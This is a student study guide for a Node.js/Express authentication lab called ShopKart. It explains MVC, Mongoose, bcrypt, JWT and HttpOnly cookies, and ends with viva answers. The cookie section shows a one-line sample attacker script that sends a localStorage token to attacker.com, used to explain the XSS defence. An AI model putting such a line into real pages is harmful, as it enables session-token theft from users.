# ShopKart Backend (Lab 01) — Complete Concepts & Syntax Guide

This comprehensive guide teaches **every single concept, pattern, and syntax** used to build the ShopKart Customer Authentication Service. It is designed to take you from the fundamentals to deep conceptual mastery so you can explain every line in your lab evaluation and viva.

---

## Table of Contents
1. [Architectural Pattern: MVC (Model-View-Controller)](#1-architectural-pattern-mvc)
2. [Modern JavaScript: ES Modules (`import`/`export`)](#2-modern-javascript-es-modules)
3. [Environment Configuration (`dotenv`)](#3-environment-configuration-dotenv)
4. [Express.js Core & Middleware Architecture](#4-expressjs-core--middleware-architecture)
5. [Database Modeling with Mongoose & MongoDB](#5-database-modeling-with-mongoose--mongodb)
6. [Password Hashing with `bcrypt`](#6-password-hashing-with-bcrypt)
7. [JSON Web Tokens (JWT) with `jsonwebtoken`](#7-json-web-tokens-jwt-with-jsonwebtoken)
8. [HttpOnly Cookies & Session Management](#8-httponly-cookies--session-management)
9. [Custom Authentication Middleware](#9-custom-authentication-middleware)
10. [RESTful API Controllers & Validation Rules](#10-restful-api-controllers--validation-rules)
11. [HTTP Status Codes Reference](#11-http-status-codes-reference)
12. [TA Viva Questions & Answers](#12-ta-viva-questions--answers)

---

## 1. Architectural Pattern: MVC

### Conceptual Model
In backend engineering, **MVC (Model-View-Controller)** separates an application into distinct layers so each file has one single responsibility:

```text
Client Request
      │
      ▼
┌──────────────┐
│    Router    │  ─── Matches URL path (e.g., /customers/register)
└──────┬───────┘
       │
       ▼
┌──────────────┐
│  Middleware  │  ─── Intercepts request (checks auth, parses cookies/JSON)
└──────┬───────┘
       │
       ▼
┌──────────────┐
│  Controller  │  ─── Business logic (validates, hashes passwords, orchestrates)
└──────┬───────┘
       │
       ▼
┌──────────────┐
│    Model     │  ─── Data structure & database interactions with MongoDB
└──────────────┘
```

### Why MVC?
- **Maintainability**: If the database schema changes, only `models/` changes.
- **Testability**: Business logic inside `controllers/` can be tested independently of routing.
- **Cleanliness**: Keeps `index.js` small and clean rather than having hundreds of lines of route handlers.

---

## 2. Modern JavaScript: ES Modules

In Node.js, there are two module systems:
1. **CommonJS** (`const express = require('express')`, `module.exports = ...`)
2. **ES Modules** (`import express from 'express'`, `export default ...`)

We enabled ES Modules by adding `"type": "module"` inside `package.json`:

```json
{
  "name": "shopkart-backend",
  "type": "module"
}
```

### Syntax Comparison

#### 1. Importing packages and local files:
```javascript
// Third-party packages (no extension required)
import express from 'express'
import bcrypt from 'bcrypt'

// Local files (MUST include .js extension in ES Modules)
import Customer from '../models/customer.model.js'
import { genToken } from '../utils/generateToken.js'
```

#### 2. Exporting:
```javascript
// Named export (can have multiple per file)
export const genToken = (id) => { ... }

// Default export (only one per file)
const Customer = mongoose.model('Customer', customerSchema)
export default Customer
```

---

## 3. Environment Configuration (`dotenv`)

### Why Do We Need Environment Variables?
- Secrets (database passwords, JWT secret keys) must **never** be hardcoded in your source code.
- If pushed to GitHub, exposed credentials can be scraped within minutes.
- Allows different settings between environments (Local Development vs. Production).

### Syntax & Usage

#### File: `.env`
```ini
PORT=8010
dbUrl=mongodb+srv://user:password@cluster0.mongodb.net/shopkart
JWT_SECRET=super_secret_key_123
```

#### File: `index.js`
```javascript
import dotenv from 'dotenv'

// 1. Reads the .env file and assigns values to process.env
dotenv.config()

// 2. Reading environment variables with a fallback default:
const PORT = process.env.PORT || 8010
const dbUrl = process.env.dbUrl
```

---

## 4. Express.js Core & Middleware Architecture

### What is Express Middleware?
A middleware is a function that runs between the incoming request and the final route response. It has access to:
- `req`: The incoming Request object.
- `res`: The outgoing Response object.
- `next`: A function that passes control to the next middleware in the pipeline.

```javascript
const customLogger = (req, res, next) => {
    console.log(`${req.method} ${req.url}`)
    next() // CRITICAL: Moves execution forward; without this, the request hangs!
}
```

### Essential Middlewares in ShopKart

```javascript
import express from 'express'
import cookieParser from 'cookie-parser'
import cors from 'cors'

const app = express()

// 1. CORS (Cross-Origin Resource Sharing)
// Allows frontend running on a different port/domain to communicate with this backend.
app.use(cors({
    origin: ['http://localhost:5173', 'http://localhost:3000'], // Allowed origins
    credentials: true // MANDATORY to allow cookies to travel between frontend and backend
}))

// 2. express.json()
// Parses incoming JSON request payloads and populates req.body.
// Without this, req.body will be undefined!
app.use(express.json())

// 3. cookieParser()
// Reads the 'Cookie' header from requests and parses it into an object on req.cookies.
// Without this, req.cookies will be undefined!
app.use(cookieParser())

// 4. Router Mounting
// Any request starting with /customers will be handled by customerRoutes
app.use('/customers', customerRoutes)
```

---

## 5. Database Modeling with Mongoose & MongoDB

### What is Mongoose?
Mongoose is an ODM (Object Data Modeling) library for MongoDB and Node.js. It provides schema validation, type casting, and query building.

### Syntax Breakdown: `models/customer.model.js`

```javascript
import mongoose from 'mongoose'

// 1. Define the Schema (the blueprint of the document)
const customerSchema = new mongoose.Schema(
    {
        fullName: {
            type: String,
            required: true,    // Field must be provided
            trim: true         // Trims whitespace before saving (" John " -> "John")
        },
        email: {
            type: String,
            required: true,
            unique: true,      // Creates a unique index in MongoDB (no duplicate emails)
            lowercase: true,   // Automatically normalizes email to lowercase
            trim: true
        },
        password: {
            type: String,
            required: true     // Stores the BCRYPT HASH, never plaintext!
        },
        phone: {
            type: String,
            required: true,
            trim: true
        }
    },
    {
        timestamps: true // Automatically creates and manages 'createdAt' and 'updatedAt' fields
    }
)

// 2. Compile Schema into a Model
// 'Customer' tells Mongoose to map to the 'customers' collection in MongoDB (lowercase + pluralized)
const Customer = mongoose.model('Customer', customerSchema)

export default Customer
```

### Essential Mongoose Query Methods Used

| Method | Syntax | Purpose |
|---|---|---|
| **`create()`** | `await Customer.create({ fullName, email, ... })` | Inserts a new document into MongoDB. |
| **`findOne()`** | `await Customer.findOne({ email })` | Finds the first matching document by query filter. |
| **`findById()`** | `await Customer.findById(id)` | Finds document by its MongoDB `_id`. |
| **`.select()`** | `Customer.findById(id).select('-password')` | Excludes fields from the query result. `-password` ensures password hash is never retrieved. |
| **`.save()`** | `await customer.save()` | Persists modifications made on an existing Mongoose document. |

---

## 6. Password Hashing with `bcrypt`

### Why Hashing Instead of Encryption?
- **Encryption is two-way**: Any encrypted data can be decrypted back into plain text if the key is compromised.
- **Hashing is one-way**: It takes an input of any length and produces a fixed-length string (digest). It cannot be mathematically reversed.

### How bcrypt Works:
1. **Salt**: A random string added to the password before hashing. This guarantees that two users with the same password (`"secret123"`) will have completely different hashes, thwarting **Rainbow Table attacks**.
2. **Cost Factor / Rounds**: Specifies how computationally expensive the hashing algorithm is (default `10` rounds = $2^{10} = 1,024$ iterations).

### Syntax

#### 1. Hashing a Password (During Registration):
```javascript
import bcrypt from 'bcrypt'

// Step 1: Generate salt with 10 rounds
const salt = await bcrypt.genSalt(10)

// Step 2: Hash plain-text password with the salt
const hashedPassword = await bcrypt.hash(plainTextPassword, salt)

// Result looks like: $2b$10$wT3ZgqW8f1QO2jZ8Y8Z8... (60 characters)
```

#### 2. Comparing Passwords (During Login):
```javascript
// Compares the entered plain-text password against the stored bcrypt hash in a timing-safe manner
const isMatch = await bcrypt.compare(enteredPassword, customer.password)

if (!isMatch) {
    // Return 401
}
```

---

## 7. JSON Web Tokens (JWT) with `jsonwebtoken`

### Anatomy of a JWT
A JSON Web Token is a compact, URL-safe means of representing claims between two parties. It is composed of three parts separated by dots (`.`):

```text
  eyJhbGciOiJIUzI1NiIsInR5cCI6IkpXVCJ9.eyJpZCI6IjY0ZGE1...IiwiaWF0Ijox...fQ.SflKxwRJSMeKKF2QT4fwpMeJf36POk6yJV_adQssw5c
  └───────────────────┬────────────────┘ └───────────────────┬────────────────┘ └─────────────────────────┬─────────────────────────┘
                   Header                                 Payload                                     Signature
```

1. **Header**: Specifies the algorithm (`HS256`) and token type (`JWT`).
2. **Payload**: The data stored in the token (e.g., `{ id: customer._id }`, expiration).
   > ⚠️ **Warning**: The payload is only **Base64-encoded**, NOT encrypted! Anyone can decode it. Never store passwords, phone numbers, or credit card info inside the payload!
3. **Signature**: Created by combining encoded Header + encoded Payload + Secret Key using the hashing algorithm. This proves the token has not been tampered with.

### Syntax: `utils/generateToken.js`

```javascript
import jwt from 'jsonwebtoken'

export const genToken = (id) => {
    // jwt.sign(payload, secretKey, options)
    return jwt.sign(
        { id },                      // Payload
        process.env.JWT_SECRET,      // Secret key
        { expiresIn: '7d' }          // Expiration time: 7 days
    )
}
```

### Syntax: Verifying a Token

```javascript
try {
    const decoded = jwt.verify(token, process.env.JWT_SECRET)
    console.log(decoded.id) // The customer ID that was signed
} catch (error) {
    // If expired or tampered with, jwt.verify throws an error!
}
```

---

## 8. HttpOnly Cookies & Session Management

### Why HttpOnly Cookies instead of `localStorage`?
- **`localStorage`**: Accessible by JavaScript via `window.localStorage`. If your application has a Cross-Site Scripting (XSS) vulnerability, an attacker can inject JavaScript to steal the token:
  ```javascript
  // Attacker script:
  fetch('https://attacker.com/steal?token=' + localStorage.getItem('token'))
  ```
- **HttpOnly Cookie**: The browser automatically attaches the cookie to matching HTTP requests, but **prohibits JavaScript** from reading it via `document.cookie`. This eliminates XSS-based token theft.

### Syntax: Setting Cookie on Login

```javascript
const cookieOptions = {
    httpOnly: true,                                       // Blocks JavaScript access (XSS defense)
    secure: process.env.NODE_ENV === 'production',        // Only transmits over HTTPS in production
    sameSite: 'lax',                                      // Protects against CSRF attacks
    maxAge: 7 * 24 * 60 * 60 * 1000                       // 7 days in milliseconds
}

res.cookie('token', token, cookieOptions)
```

### Syntax: Clearing Cookie on Logout

```javascript
// Clearing requires identical options (path, domain, sameSite)
res.clearCookie('token', {
    httpOnly: true,
    secure: process.env.NODE_ENV === 'production',
    sameSite: 'lax'
})
```

---

## 9. Custom Authentication Middleware

### Flow of `auth.middleware.js`

```text
Request to /customers/me
          │
          ▼
Does req.cookies.token exist?
   ├── NO  ──► Return 401 "Unauthorized - No token provided"
   └── YES
          │
          ▼
Verify token with jwt.verify()
   ├── INVALID/EXPIRED ──► Return 401 "Unauthorized - Invalid or expired token"
   └── VALID
          │
          ▼
Find customer in DB by decoded.id (excluding password)
   ├── NOT FOUND ──► Return 401 "Unauthorized - Customer not found"
   └── FOUND
          │
          ▼
Attach to request: req.user = customer
Call next()
          │
          ▼
Execute Controller (getCustomerProfile)
```

### Code Breakdown with Common Mistake Prevention

```javascript
import jwt from 'jsonwebtoken'
import Customer from '../models/customer.model.js'

export const isAuthenticated = async (req, res, next) => {
    try {
        // 1. Read token from cookies
        const token = req.cookies.token

        // CRITICAL: Always use 'return' before res.status().
        // If you don't return, execution continues to subsequent lines!
        if (!token) {
            return res.status(401).json({ message: 'Unauthorized - No token provided' })
        }

        // 2. Verify signature and expiration
        const decoded = jwt.verify(token, process.env.JWT_SECRET)

        // 3. Retrieve user without password
        const customer = await Customer.findById(decoded.id).select('-password')

        if (!customer) {
            return res.status(401).json({ message: 'Unauthorized - Customer not found' })
        }

        // 4. Attach authenticated user to the request object
        req.user = customer

        // 5. Pass control to the next handler
        next()
    } catch (error) {
        return res.status(401).json({ message: 'Unauthorized - Invalid or expired token' })
    }
}
```

---

## 10. RESTful API Controllers & Validation Rules

### Task 1: Registration (`POST /customers/register`)
- **Inputs**: `{ fullName, email, password, phone }`
- **Validation**:
  - Missing field check: `if (!fullName || !email || !password || !phone) return res.status(400)`
  - Password length: `if (password.length < 6) return res.status(400)`
  - Duplicate check: `const existing = await Customer.findOne({ email }); if (existing) return res.status(409)`
- **Response**: `201 Created` with customer data (excluding password).

### Task 2: Login (`POST /customers/login`)
- **Inputs**: `{ email, password }`
- **Security Rule**: Never disclose whether the email or password was wrong. Return generic `401 Unauthorized` with `"Invalid credentials"`:
  ```javascript
  const customer = await Customer.findOne({ email })
  if (!customer) {
      return res.status(401).json({ message: 'Invalid credentials' })
  }

  const isPasswordMatch = await bcrypt.compare(password, customer.password)
  if (!isPasswordMatch) {
      return res.status(401).json({ message: 'Invalid credentials' })
  }
  ```
- **Response**: `200 OK` + HttpOnly cookie.

### Task 3: Profile (`GET /customers/me`)
- **Protection**: Uses `isAuthenticated` middleware.
- **Controller**:
  ```javascript
  export const getCustomerProfile = async (req, res) => {
      res.status(200).json({
          _id: req.user._id,
          fullName: req.user.fullName,
          email: req.user.email,
          phone: req.user.phone
      })
  }
  ```

### Task 4: Logout (`POST /customers/logout`)
- **Operation**: Clears `token` cookie.
- **Response**: `200 OK` `{ success: true, message: "Logged out successfully" }`.

### Bonus: Change Password (`PATCH /customers/change-password`)
- **Inputs**: `{ oldPassword, newPassword }`
- **Steps**:
  1. Retrieve customer with password from DB: `const customer = await Customer.findById(req.user._id)`.
  2. Verify `oldPassword` with `bcrypt.compare`.
  3. Validate `newPassword.length >= 6`.
  4. Hash new password: `customer.password = await bcrypt.hash(newPassword, salt)`.
  5. `await customer.save()`.

---

## 11. HTTP Status Codes Reference

| Code | Meaning | When Used in ShopKart |
|---|---|---|
| **`200 OK`** | Request succeeded | Successful login, profile retrieval, logout, and password update. |
| **`201 Created`** | Resource created | Successful registration of a new customer. |
| **`400 Bad Request`** | Client validation failure | Missing fields, password shorter than 6 characters, incorrect old password. |
| **`401 Unauthorized`** | Authentication failure | Missing token, invalid/expired token, wrong login credentials. |
| **`404 Not Found`** | Resource does not exist | Customer ID not found in database. |
| **`409 Conflict`** | Resource collision | Attempting to register an email that already exists. |
| **`500 Internal Error`** | Server-side exception | Uncaught database errors or runtime crashes. |

---

## 12. TA Viva Questions & Answers

### Q1: Why do we use `bcrypt` instead of encrypting passwords?
> **Answer**: Encryption is two-way (can be decrypted using an encryption key). If the key or server is compromised, all user passwords are leaked. `bcrypt` is a one-way mathematical hashing function with built-in salts and configurable cost factors, meaning the original password cannot be reversed even if the database is leaked.

### Q2: What information is typically stored inside a JWT payload?
> **Answer**: Only non-sensitive identifying data such as the user's MongoDB `_id` (`userId`), role, and token metadata like expiration (`exp`) and issuance time (`iat`). Sensitive data like passwords, salts, or financial details must **never** be placed in the payload because the payload is merely Base64-encoded and can be read by anyone.

### Q3: Why is the `HttpOnly` flag important for cookies?
> **Answer**: The `HttpOnly` flag instructs the browser that the cookie should not be accessible via client-side JavaScript (`document.cookie`). This protects session tokens against Cross-Site Scripting (XSS) attacks where malicious scripts attempt to steal authentication tokens.

### Q4: Why should passwords never be returned to the frontend in an API response?
> **Answer**: Returning even a hashed password exposes it to client-side logging, network sniffing, browser extensions, and caching. Furthermore, having password hashes available on the client allows attackers to perform offline brute-force or dictionary attacks without contacting the server.

### Q5: What is the purpose of authentication middleware?
> **Answer**: Authentication middleware acts as a centralized gatekeeper for protected endpoints. Instead of duplicating token verification logic in every controller, middleware intercepts incoming requests, validates the session token, retrieves the user, and attaches it to `req.user`. If authentication fails, it terminates the request immediately with `401 Unauthorized`.
